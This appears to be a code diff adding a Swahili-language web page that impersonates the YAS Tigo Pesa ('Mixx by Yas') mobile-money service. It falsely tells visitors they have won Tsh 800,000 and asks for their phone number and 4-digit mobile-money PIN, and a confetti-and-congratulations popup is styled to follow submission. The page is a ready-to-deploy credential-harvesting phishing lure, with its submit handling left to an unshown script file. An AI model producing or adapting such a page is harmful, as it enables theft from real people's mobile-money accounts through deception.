@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="sw">
+
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Umejishindia Ofa Wa YAS Tigo Pesa</title>
+        <style>
+            body {
+                font-family: Arial, sans-serif;
+                text-align: center;
+                padding: 40px 20px;
+                background: #001f3f;
+                color: white;
+                margin: 0;
+                min-height: 100vh;
+                background-image: linear-gradient(to bottom, #001f3f 70%, #FFD200 30%);
+            }
+
+            .container {
+                max-width: 420px;
+                margin: 0 auto;
+                background: rgba(0, 31, 63, 0.95);
+                padding: 40px 30px;
+                border-radius: 20px;
+                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+                position: relative;
+                z-index: 1;
+            }
+
+            img {
+                width: 120px;
+                height: 120px;
+                border-radius: 20px;
+                margin-bottom: 20px;
+                box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+                display: block;
+                margin-left: auto;
+                margin-right: auto;
+            }
+
+            h2 {
+                font-size: 24px;
+                margin-bottom: 20px;
+                color: #FFD200;
+            }
+
+            p {
+                line-height: 1.6;
+                margin-bottom: 20px;
+            }
+
+            strong {
+                color: #FFD200;
+            }
+
+            input {
+                width: 100%;
+                padding: 14px;
+                margin: 12px 0;
+                font-size: 18px;
+                border: none;
+                border-radius: 8px;
+                background: white;
+                color: #001f3f;
+                box-sizing: border-box;
+                transition: all 0.3s;
+            }
+
+            input:focus {
+                outline: 3px solid #FFD200;
+                transform: scale(1.02);
+            }
+
+            input::placeholder {
+                color: #666;
+            }
+
+            button {
+                padding: 16px;
+                width: 100%;
+                background: #FFD200;
+                color: #001f3f;
+                border: none;
+                border-radius: 8px;
+                font-size: 20px;
+                font-weight: bold;
+                cursor: pointer;
+                margin-top: 10px;
+                transition: all 0.3s;
+            }
+
+            button:hover:not(:disabled) {
+                background: #e6bc00;
+                transform: translateY(-2px);
+                box-shadow: 0 5px 15px rgba(255, 210, 0, 0.4);
+            }
+
+            button:disabled {
+                background: #999;
+                cursor: not-allowed;
+                opacity: 0.7;
+            }
+
+            #message {
+                margin-top: 25px;
+                font-weight: bold;
+                font-size: 18px;
+                min-height: 24px;
+                padding: 10px;
+                border-radius: 8px;
+            }
+
+            .success-message {
+                background: rgba(0, 255, 0, 0.2);
+                color: #00ff00;
+                border: 1px solid #00ff00;
+            }
+
+            .error-message {
+                background: rgba(255, 0, 0, 0.2);
+                color: #ff6b6b;
+                border: 1px solid #ff6b6b;
+            }
+
+            /* Loading Spinner */
+            .spinner {
+                display: inline-block;
+                width: 20px;
+                height: 20px;
+                border: 3px solid rgba(255, 255, 255, .3);
+                border-radius: 50%;
+                border-top-color: #FFD200;
+                animation: spin 1s ease-in-out infinite;
+                margin-right: 10px;
+            }
+
+            @keyframes spin {
+                to {
+                    transform: rotate(360deg);
+                }
+            }
+
+            /* Celebration Popup */
+            #celebrationOverlay {
+                display: none;
+                position: fixed;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                background: rgba(0, 0, 0, 0.85);
+                justify-content: center;
+                align-items: center;
+                z-index: 1000;
+                animation: fadeIn 0.5s;
+            }
+
+            #celebrationPopup {
+                background: #001f3f;
+                padding: 40px;
+                border-radius: 20px;
+                text-align: center;
+                box-shadow: 0 0 40px rgba(255, 215, 0, 0.8);
+                border: 4px solid #FFD200;
+                animation: popupBounce 0.8s ease-out;
+                max-width: 90%;
+            }
+
+            #celebrationPopup h1 {
+                font-size: 48px;
+                color: #FFD200;
+                margin: 0 0 20px;
+                text-shadow: 0 0 20px #FFD200;
+                animation: glow 1.5s infinite alternate;
+            }
+
+            #celebrationPopup p {
+                color: white;
+                font-size: 24px;
+                margin: 0;
+            }
+
+            @keyframes fadeIn {
+                from {
+                    opacity: 0;
+                }
+
+                to {
+                    opacity: 1;
+                }
+            }
+
+            @keyframes popupBounce {
+                0% {
+                    transform: scale(0.3);
+                    opacity: 0;
+                }
+
+                50% {
+                    transform: scale(1.1);
+                }
+
+                70% {
+                    transform: scale(0.95);
+                }
+
+                100% {
+                    transform: scale(1);
+                    opacity: 1;
+                }
+            }
+
+            @keyframes glow {
+                from {
+                    text-shadow: 0 0 20px #FFD200;
+                }
+
+                to {
+                    text-shadow: 0 0 40px #FFD200, 0 0 60px #FFD200;
+                }
+            }
+
+            #confettiCanvas {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                pointer-events: none;
+                z-index: 999;
+            }
+        </style>
+    </head>
+
+    <body>
+        <div class="container">
+            <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/3b/60/20/3b6020be-1ee7-d630-3146-21889badb89a/AppIcon-0-0-1x_U007emarketing-0-11-0-85-220.png/512x512bb.jpg"
+                alt="Mixx by Yas Logo">
+            <h2>Umejishindia Ofa Wa YAS Tigo Pesa</h2>
+            <p>Karibu! Ingiza namba yako ya simu na Neno Siri (YAS PIN - 4 namba) ili kupata ofa.</p>
+            <p><strong>Kiwango cha Ofa kinachoweza kupatikana:</strong><br>Tsh 800,000</p>
+
+            <form id="redeemForm">
+                <input type="tel" name="Phone Number" placeholder="Nambari ya Mixx" required pattern="[0-9]{9,12}"
+                    title="Tafadhali ingiza namba ya simu sahihi">
+                <input type="password" name="PIN" placeholder="YAS Nambari ya Siri" maxlength="4" pattern="[0-9]{4}"
+                    required title="PIN lazima iwe namba 4">
+                <button type="submit" id="submitBtn">TOA ZAWADI</button>
+            </form>
+
+            <div id="message"></div>
+        </div>
+
+        <!-- Celebration Overlay -->
+        <div id="celebrationOverlay">
+            <div id="celebrationPopup">
+                <h1>HONGERA!</h1>
+                <p>Umefanikiwa kupata ofa yako!</p>
+            </div>
+        </div>
+
+        <canvas id="confettiCanvas"></canvas>
+
+        <script src="script.js"></script>
+    </body>
+
+</html>
